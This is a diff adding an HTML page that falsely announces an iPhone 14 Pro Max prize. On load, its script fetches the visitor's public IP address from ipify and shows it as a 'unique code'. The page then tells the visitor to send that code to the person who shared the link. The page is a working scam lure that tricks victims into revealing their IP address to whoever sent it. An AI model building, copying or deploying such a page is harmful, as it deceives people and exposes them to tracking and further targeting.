@@ -1,0 +1,39 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>Congratulations!</title>
+  <style>
+    body {
+      text-align: center;
+      background-image: url('wp5315397.jpg');
+      background-size: cover;
+      color: white;
+      font-family: 'Futura', sans-serif;
+    }
+    h1, h2, p {
+      font-family: 'Futura', sans-serif;
+    }
+  </style>
+  <script>
+    function getIP() {
+      fetch('https://api.ipify.org/?format=json')
+        .then(response => response.json())
+        .then(data => {
+          const ip = data.ip;
+          document.getElementById('ipAddress').textContent = ip;
+        })
+        .catch(error => {
+          console.error('Error:', error);
+        });
+    }
+  </script>
+</head>
+<body onload="getIP()">
+  <h1>Congratulations on winning an iPhone 14 Pro Max!</h1>
+  <button onclick="getIP()">Click here to claim today!</button>
+  <h2>Your Unique Code:</h2>
+  <p id="ipAddress">Loading...</p>
+  <p>Important note: The code that you have received must be copied and sent to the user who has shared this link with you. Further shipping process will be done once the code is verified.</p>
+  <img src="iPhone-14-PNG-Isolated-File.png" alt="Your Image">
+</body>
+</html>
